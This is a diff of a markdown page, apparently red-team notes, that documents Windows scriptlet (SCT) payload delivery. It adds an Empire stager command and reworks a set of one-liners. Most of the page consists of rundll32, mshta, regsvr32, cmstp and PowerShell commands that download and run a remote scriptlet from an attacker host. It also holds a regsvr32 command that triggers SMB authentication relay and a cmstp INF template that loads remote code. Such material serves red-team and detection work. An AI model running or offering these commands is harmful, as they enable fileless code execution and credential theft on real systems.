@@ -13,7 +13,19 @@ credits:
 ---
 # Scriptlet
 
-Fileless scriptlet implant template.
+## 01 - Generate Payloads
+
+### 1.1 - Generate a payload via Empire
+
+TODO: Fill this info
+
+```
+(Empire) > usestager windows/launcher_sct
+```
+
+### Scriptlet Template
+
+Fileless scriptlet payload template.
 
 ```xml
 <?XML version="1.0"?>
@@ -30,36 +42,38 @@ Fileless scriptlet implant template.
 </scriptlet>
 ```
 
-## 01 - Command Prompt
+## Execute Payload
 
-### 1.1 - `rundll32.exe`
+### 01 - Command Prompt
 
-```
-C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/implant.sct");window.close();
-```
-
-### 1.2 - `mshta.exe`
+#### 1.1 - `rundll32.exe`
 
 ```
-C:\> mshta.exe javascript:execute=GetObject("script:http[s]://<attacker_IP>/implant.sct");execute.Exec();close();
-
-C:\> mshta.exe vbscript:Close(Execute("GetObject(""script:http[s]://<attacker_IP>/implant.sct"")"))
+C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/payload.sct");window.close();
 ```
 
-### 1.3 - `regsvr32.exe`
-
-Execute a SCT dropper implant.
+#### 1.2 - `mshta.exe`
 
 ```
-C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
+C:\> mshta.exe javascript:execute=GetObject("script:http[s]://<attacker_IP>/payload.sct");execute.Exec();close();
+
+C:\> mshta.exe vbscript:Close(Execute("GetObject(""script:http[s]://<attacker_IP>/payload.sct"")"))
 ```
 
-Execute a fileless implant.
+#### 1.3 - `regsvr32.exe`
+
+Execute a SCT dropper payload.
 
 ```
-C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/implant.sct scrobj.dll
+C:\> regsvr32.exe /s /u /i:payload.sct scrobj.dll
+```
 
-C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\implant.sct scrobj.dll
+Execute a fileless payload.
+
+```
+C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/payload.sct scrobj.dll
+
+C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\payload.sct scrobj.dll
 ```
 
 Execute command to perform SMB authentication relay.
@@ -68,9 +82,9 @@ Execute command to perform SMB authentication relay.
 C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
 ```
 
-### 1.4 - `cmstp.exe`
+#### 1.4 - `cmstp.exe`
 
-Fileless scriptlet implant template
+Fileless scriptlet payload template
 
 ```
 [version]
@@ -81,7 +95,7 @@ AdvancedINF=2.5
 UnRegisterOCXs=UnRegisterOCXSection
 
 [UnRegisterOCXSection]
-%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/implant.sct
+%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/payload.sct
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
@@ -89,28 +103,28 @@ ServiceName="Yay"
 ShortSvcName="Yay"
 ```
 
-Execute implant.
+Execute payload.
 
 ```
-C:\> cmstp.exe /ni /s implant.inf
+C:\> cmstp.exe /ni /s payload.inf
 ```
 
-Execute fileless implant.
+Execute fileless payload.
 
 ```
-C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
+C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/payload.inf
 ```
 
-## 02 - PowerShell
+### 02 - PowerShell
 
 ```
-PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http[s]://<attacker_IP>/implant.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
+PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http[s]://<attacker_IP>/payload.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
 ```
 
 Another PowerShell Assembly Reflection SCT Code Execution Example w/ 'Microsoft.VisualBasic.Interaction' -
 
 ```
-PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http[s]://<attacker_IP>/implant.sct').Exec(0)
+PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http[s]://<attacker_IP>/payload.sct').Exec(0)
 ```
 
 ---
